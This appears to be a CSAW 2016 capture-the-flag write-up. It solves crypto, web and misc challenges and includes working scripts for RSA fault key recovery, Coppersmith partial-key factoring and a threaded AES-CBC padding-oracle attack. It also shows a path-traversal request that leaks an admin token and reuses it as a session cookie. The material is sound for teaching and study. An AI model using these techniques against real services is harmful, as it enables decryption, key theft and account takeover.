# Sleeping guard (50 p)
```
Only true hackers can see the image in this magic PNG....

nc crypto.chal.csaw.io 8000

Author: Sophia D'Antoine
```

Connecting to the server, we get a BASE64 stream of data. Decrypting it, we see that it is not a valid PNG. Let us try simple XOR. We take a known plaintext from another PNG and try to XOR with the cipertext in hope to get the key.

```python
# extracted from reference image
header = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 
          0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52, 
		  0x00, 0x00, 0x07, 0x9C, 0x00, 0x00, 0x05, 0x7A, 
		  0x08, 0x06, 0x00, 0x00, 0x00, 0x31, 0xA6, 0x00, 
		  0xF6, 0x00, 0x00, 0x00]

f = open('magic.png', 'r')
i = 0
j = 8
out = ''
data = f.read()
for char in data:
    out += chr(ord(char) ^ header[i % len(header)])
    i += 1
key = out[0:12]
print 'Found key: {0}'.format(key)
output = ''
```

This gives us `WoAh_A_Key!?`. Re-using the code,

```python
f = open('magic.png', 'r')
i = 0
data = f.read()
for char in data:
    output += chr(ord(char) ^ ord(key[i % len(key)]))
    i += 1

f = open('decrypted.png', 'w')
f.write(output)
```

Running it, we decode the image as follows:

![decrypted](sleeping_guard/decrypted.png)


# Broken box (300 p)

```
I made a RSA signature box, but the hardware is too old that
sometimes it returns me different answers... can you fix it for me?

e = 0x10001

nc crypto.chal.csaw.io 8002
```
The obvious guess of error source is a simple RSA-CRT fault. This means that there is an error in the CRT when computing the signature, which means gcd(sᵉ - m, N) > 1 allowing us to factor N. The following function tests if there are such anomalies:

```python

def test_crt_faults():
    print '[+] Testing faults in CRT...'

    for sig in faulty:
        ggcd = gcd(ver(sig) - msg, N)
    
        if ggcd > 1:
            print "[!] Found factor {0}".format(ggcd)
            break
        
        for fsig in faulty:
            if fsig != sig:
                # try to detect constant errors
                ggcd = gcd(N + ver(sig) - ver(fsig), N)
                ggcd = ggcd * gcd(ver(sig - fsig), N)
                if ggcd > 1:
                    print "[!] Found factor {0}".format(ggcd)
                    break
    if ggcd == 1:
        print '[-] No factors found...'
		
```

Turns out, there are no such faults present. Hmm... so what is a possible source of error? The modulus N or the exponent d. The modulus N is a bit cumbersome to handle, so lets try with the secret exponent!

First, we sample a lot of signatures from the service. Then, we split the set into a correct signature and several faulty ones.

```python

valid, faulty = [], []
msg = 2
f = open('sigs2.txt', 'r')

for line in f:
    sig = int(line)
    if ver(sig) == 2: valid.append(sig)
    else: faulty.append(sig)
```

Assume that we have a proper signature s and a faulty signature f, then we may compute s × f⁻¹ = mᵈ × (mᵈ⁻ʲ)⁻¹ = mʲ. If it is a single-bit error, then j = ±2ⁱ. First we build a look-up table with all 

```python
    look_up = {pow(msg, pow(2,i), N) : i for i in range(0,1024)}
```

This is merely a way to quickly determine i from  ±2ⁱ mod N. Then, for each faulty signature, we compute s × q⁻¹ and s⁻¹ × f and see if there is a match in the table. Since a bit flip is a simple xor, we need to take into account both the change 1 → 0 and 0 → 1. So, if s⁻¹ × f is in the table, then it means the contribution from the bit flip is positive. Therefore, d must be 0 in this position. Equivalently, if s × f⁻¹ is in the table, d must be 1 in that position. It remains to look at sufficiently many random signatures to fill the gaps in information of d.

A high-level description of the algorithm is as follows:

```psuedo
algorithm brokenbox(m):
    output: secret exponent d

	precomputation:
	    compute Q[mⁱ] = i for i ∈ {0,1...,1024}

	online computation:
		1. query oracle for signature of m
		2. check if sᵉ = m (mod N)
		3. if true, save it as reference value s.
		   else, save in list L
		4. repeat 1-3 until sufficiently many signatures have been obtained
		5. for f ∈ L: 
		      compute s × f⁻¹ (mod N) and s⁻¹ × f (mod N)
			  if s × f⁻¹ ∈ Q, set bit Q[s × f⁻¹] in d to 0
			  if s⁻¹ × f ∈ Q, set bit Q[s⁻¹ × f] in d to 1
```


We achieve the recovery as follows:

```python
def test_exponent_faults():
    print '[+] Generating lookup...'
    
    number = ['?'] * 1024
    look_up = {pow(msg, pow(2,i), N) : i for i in range(0,1024)}
    valid_inv = libnum.modular.invmod(valid[0], N)
    
    print '[+] Looking for matches and recovering secret exponent...'
    
    for sig in faulty:
        st = (sig * valid_inv) % N
        
        if st in look_up: 
            number[look_up[st]] = '0'
        st = (libnum.modular.invmod(sig, N) * valid[0]) % N
        
        if st in look_up: 
            number[look_up[st]] = '1'
            
    unknown = number.count('?')
    
    if unknown == 0:
        d = int(''.join(number[::-1]), 2)
        
        print 'Secret exponent is: {0}'.format(d)
        print 'Check:', valid[0] == pow(msg, d, N)
        
        return d
    else:
        print '[+] Recovered bits'
        print ''.join(number)
        print 'Remaining unknown: {0} / {1}'.format(unknown, len(number))
```

For instance, after a few hundred faulty signatures, we have filled in the bit pattern:


```c
???1???1??????0????0???0?0?11?1??1???1?1??1???????0010??1??10???????1001?1???????1?1?00?????????1?????0??0??1??0??
0??100?0?0?01??10?01????????10??0???1??????1??0???0???0???0?0?0000?110?????1????0001?011?0??0??1?????????????1????
??1??10???????0?1?10??????????0???0??0??0?????????1???1?1?1??????10?0110?????????0???1???1????0?0?0???????1???????
???1????????11?????1??1??0?????00????????1??0?1???10???????11??01000??0???1????1?0???00?1??1?10??0????0???1???1?1?
?0????????1????1?1??0????1????1????0??01??11??0????0???????0?10????0????0???0????????1?????????11??0???0?????1????
0????01????1???????100???????111?00?0??00????1?10??????????1?0????1???????0??1?0?11???11?????????????1??0???01????
????1???0?1??????0001??????1???010???????100?1??????10?????0?01??1???0??????????1??1??0???0??????00??1??11??01?0?0
1?0?1????00????0???0?0?1????0?0??1?0??1????10???????1???00????10??0????0?1??????1?1?0?1?????1?1?01???10??1??????0?
???10???1?????0?10??????????1???110???1?01??0?????1????11??0?????11??0????1??1?0???11?0??0????1?????0??1?????10?
```

Running a few more, we get

```
[+] Found 1520 valid and 1510 faulty signatures!
[+] Generating lookup...
[+] Looking for matches and recovering secret exponent...
Secret exponent is: 1318114196677043534196699342738014984976469352105320281204477993086640079603572783402617238085 726375484075509084032393449039977882965644396676597161109348224128554215866738089041936064811376790441326881154721
3257515039998690149350105787817443487153162937855786664238603417924072736209641094219963164897214757
Check: True
flag{br0k3n_h4rdw4r3_l34d5_70_b17_fl1pp1n6}
```

# Still broken box (400 p)

```
I fixed the RSA signature box I made, even though it still 
returns wrong answers sometimes, it get much better now.

e = 97

nc crypto.chal.csaw.io 8003
```

Re-using the same code we wrote before, we get

```
[+] Found 596 valid and 600 faulty signatures!
[+] Generating lookup...
[+] Looking for matches and recovering secret exponent...
[+] Recovered bits
??????????????????????????????????????????????????????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????????????????????????????????????????????????????
????????????????????????????????????????00000110000110100001000110111001011110000000101100101100010101011110010011
101111101110101011101011001011111100100110011100101000011111010001001100110000100111000000101110110000010011111010
0011000000101100011110110010110100010111000110011101000111010011011100111001101110001110110011111010111011101101

Remaining unknown: 724 / 1024
```

Pretty much the same as above, but the error does only occur in the lower region of d. Also, about 1/4 of the bits. This is a case for a partial key exposure attack :-) We omitt the gritty details here, but it is pretty easy to understand when you realize that some mathematical relations hold when known only a subset of the bits of d. A short explanation:

Define s = p + q. We know that e × d (mod φ(N)) = 1. So, for some k ≤ e, we have

    e × d - k × φ(N) = e × d - k × (N - s + 1) = 1.

Now, we can try all 0 ≤ k ≤ e and then solve the equation for s. Then, we can easily compute φ(N) = N - s + 1. It also holds for the partially know d, which we denote d' = d (mod 2³⁰⁰). Hence, it also holds that

	e × d' - k × (N - s + 1) = 1 (mod 2³⁰⁰).

The, we solve a quadratic equation (this is the equation you would solve to factor N given φ(N)) for p

    p² - s × p + N = 0 (mod 2³⁰⁰).

Note that we have to repeat this procedure for every choice of k.

Finally, we use a Theorem due to Coppersmith which states that we can factor N in time O(poly(log(N))). For more info, see my other writeups e.g. [this one](https://grocid.net/2016/03/14/0ctf-equation/). We can implement the above in Sage as follows:


```python
d = 48553333005218622988737502487331247543207235050962932759743329631099614121360173210513133
known_bits = 300
X = var('X')
d0 = d % (2 ** known_bits)
P.<x> = PolynomialRing(Zmod(N))

print '[ ] Thinking...'
for k in xrange(1, e+1):
    results = solve_mod([e * d0 * X - k * X * (N - X + 1) + k * N == X], 2 ** 300)

    for m in results:
        f = x * 2 ** known_bits + ZZ(m[0])
        f = f.monic()
        roots = f.small_roots(X = 2 ** (N.nbits() / 2 - known_bits), beta=0.3)

        if roots:
            x0 = roots[0]
            p = gcd(2 ** known_bits * x0 + ZZ(m[0]), N)
            print '[+] Found factorization!'
            print 'p =', ZZ(p)
            print 'q =', N / ZZ(p)
            break
```

If we run it, we get

```
[ ] Thinking...
[+] Found factorization!
p = 11508259255609528178782985672384489181881780969423759372962395789423779211087080016838545204916636221839732993706338791571211260830264085606598128514985547 
q = 10734991637891904881084049063230500677461594645206400955916129307892684665074341324245311828467206439443570911177697615473846955787537749526647352553710047
```

We can compute d = e⁻¹ mod φ(N). Using the found d to decrypt, we determine the flag

```
flag{n3v3r_l34k_4ny_51n6l3_b17_0f_pr1v473_k3y}
```

# Neo (200 p)

```
Your life has been boring, seemingly meaningless up until now. A man in a 
black suit with fresh shades is standing in front of you telling you that
you are The One. Do you chose to go down this hole? Or just sit around 
pwning n00bs for the rest of your life?

http://crypto.chal.csaw.io:8001/
```

We get to a page with an input, already containing some BASE64-encoded data. Substituting it with some gibberish (as can be seen below), yields and interesting error...

![neo](neo/neo.png)

So, it is AES! Alright then... there is an encrypted id or token. It seems random, but that may just be the IV. Also, the image about suggests that the Matrix is vulnerable to a padding-oracle attack. In brief words, this is an attack which exploits the property of AES-CBC that Pᵢ = Dec(Cᵢ, k) ⊕ Cᵢ₋₁. Since the function Dec is bijective, we have that for an altered ciphertext C'ᵢ₋₁ there exists a valid plaintext P'ᵢ₋₁ = Dec(Cᵢ₋₁, k) (although it is probably just gibberish, it will not cause an error!). So, by flipping bits Cᵢ₋₁, we can cause Pᵢ to have a non-proper padding which will cause an error that we may be notified about (this is the case here!). By setting modifying Cᵢ₋₁ so that 

     C'ᵢ₋₁ = Cᵢ₋₁ ⊕ 0x0...1 ⊕ 0x0...0[guessed byte] 

we can determine the value in the corresponding position of Pᵢ.

First, we define an oracle as follows:

```python
def oracle(payload):
    global responses
    r = requests.post('http://crypto.chal.csaw.io:8001', 
        data = {'matrix-id' : base64.b64encode(binascii.unhexlify(payload))})
    if 'Caught exception during AES decryption...' in r.text: responses[payload] = False
    else: responses[payload] = True
```

So, if there is padding error, it will return `False` and otherwise `True`. In the [id0-rsa](http://id0-rsa.pub) challenge, I wrote a multi-threaded padding-oracle code in Python (which finishes the attack in no time at all :-D). We will re-use this code here!

If we set the parameters

```python
import requests, base64, binascii
import thread, time, string, urllib2, copy

threads = 20
alphabet = ''.join([chr(i) for i in range(16)]) + string.printable
alphabet_blocks = [alphabet[i : i + threads] for i in range(0, len(alphabet), threads)]
data = 'vwqB+7cWkxMC6fY55NZW6y/LcdkUJqakXtMZIpS1YqbkfRYYOh0DKTr9Mp2QwNLZkBjyuLbNLghhSVNkHcng+Vpmp5WT5OAnhUlEr+LyBAU='
ciphertext = binascii.hexlify(base64.b64decode(data))[:] # adjust to get other blocks
offset = len(ciphertext)/2-16
```

and then, the very heart of the padding-oracle code:

```python
def flip_cipher(ciphertext, known, i):
    modified_ciphertext = copy.copy(ciphertext)
    for j in range(1, i): modified_ciphertext[offset-j] = ciphertext[offset-j] ^ ord(known[-j]) ^ i
    return modified_ciphertext
    
ciphertext = [int(ciphertext[i:i+2], 16) for i in range(0, len(ciphertext), 2)]
count, known = 1, ''

while True:
    print 'Found so far:', [known]
    for block in alphabet_blocks:
        responses, payloads = {}, {}
        modified_ciphertext = flip_cipher(ciphertext, known, count)
        
        for char in block:
            modified_ciphertext[offset-count] = ciphertext[offset-count] ^ ord(char) ^ count
            payloads[''.join([hex(symbol)[2:].zfill(2) for symbol in modified_ciphertext])] = char
        
        for payload in payloads.keys(): thread.start_new_thread(oracle, (payload,))
        
        while len(responses.keys()) != len(payloads): time.sleep(0.1)
        
        if True in responses.values(): 
            known = payloads[responses.keys()[responses.values().index(True)]] + known
            alphabet_blocks.remove(block)
            alphabet_blocks.insert(0, block)
            count = count + 1
            break
```

and execute it for different from-right truncated ciphertexts, we obtain

```
Found so far: ['flag{what_if_i_t']
Found so far: ['old_you_you_solv']
Found so far: ['ed_the_challenge']
Found so far: ['}\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f']
```

So, by removing the padding, we get the flag

```
flag{what_if_i_told_you_you_solved_the_challenge}
```
Great!
# wtf.sh (150 p)

```
WTF.SH(1)               Quals               WTF.SH(1)

NAME
       wtf.sh - A webserver written in bash

SYNOPSIS
       wtf.sh port

DESCRIPTION
       wtf.sh is a webserver written in bash.
       Do I need to say more?

FLAG
       You can get the flag to this first part of the
       problem by getting  the  website  to  run  the
       get_flag1  command. I heard the admin likes to
       launch it when he visits his own profile.

ACCESS
       You can find wtf.sh at http://web.chal.csaw.io:8001/

AUTHOR
       Written  by  _Hyper_  http://github.com/Hyper-
       sonic/

SUPERHERO ORIGIN STORY
       I have deep-rooted problems
       That  involve  childhood  trauma  of  too many
       shells
       It was ksh, zsh, bash, dash
       They just never stopped
       On that day I swore I would have vengeance
       I became
       The Bashman

REPORTING BUGS
       Report  your  favorite  bugs  in   wtf.sh   at
       http://ctf.csaw.io

SEE ALSO
       wtf.sh(2)

CSAW 2016           September 2016          WTF.SH(1)
```

Seemingly, we can enumerate users on the service.

```
GET /post.wtf?post=../../../../../../../../../../../tmp/wtf_runtime/wtf.sh/users*
Host: web.chal.csaw.io:8001
...
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=7tLx9">admin</a></span>
<span class="post-title">facb59989c28a17cf481e2f5664d4aaeff1651b8</span>
<span class="post-body">2xRnmiXo9/f7GCEXkdZ2XqdtaLUAe0KOl7xibP4rMfS82Kfy/PbNuwaDODgRctRxiUxG0ys5Aq5PLlbq4/GPiQ==</span>
</div>
...
```
So, we have extracted the password hash and the token. We can set the token and get the flag as follows:

```
Cookie: USERNAME=admin; TOKEN=2xRnmiXo9/f7GCEXkdZ2XqdtaLUAe0KOl7xibP4rMfS82Kfy/PbNuwaDODgRctRxiUxG0ys5Aq5PLlbq4/GPiQ==
GET /profile.wtf?user=7tLx9 HTTP/1.1
Host: web.chal.csaw.io:8001
...
flag{l00k_at_m3_I_am_th3_4dm1n_n0w}

```

# Coinslot (25 p)

```
#Hope #Change #Obama2008

nc misc.chal.csaw.io 8000
```

The only hard thing about this challenge is to make it handle floats properly, but Numpy and transforming to integer 1/100 parts solves it :-)

```python
from pwn import *
import numpy

s = remote('misc.chal.csaw.io', 8000)
bills = [10000,5000,1000,500,100,50,20,10,5,1,0.5,0.25,0.1,0.05,0.01]
while True:
    amount = float(s.recvuntil('\n')[1:])
    amount = int(numpy.round(amount * 100))
    send = [0] * len(bills)
    for i in range(len(bills)):
        while bills[i] * 100 <= amount:
            amount -= bills[i] * 100
            send[i] += 1
    for i in send:
        s.recvuntil(':')
        s.send(str(i) + '\n')
    print s.recvuntil('\n')
```

After a lot of time, we get

```
flag{started-from-the-bottom-now-my-whole-team-fucking-here}
```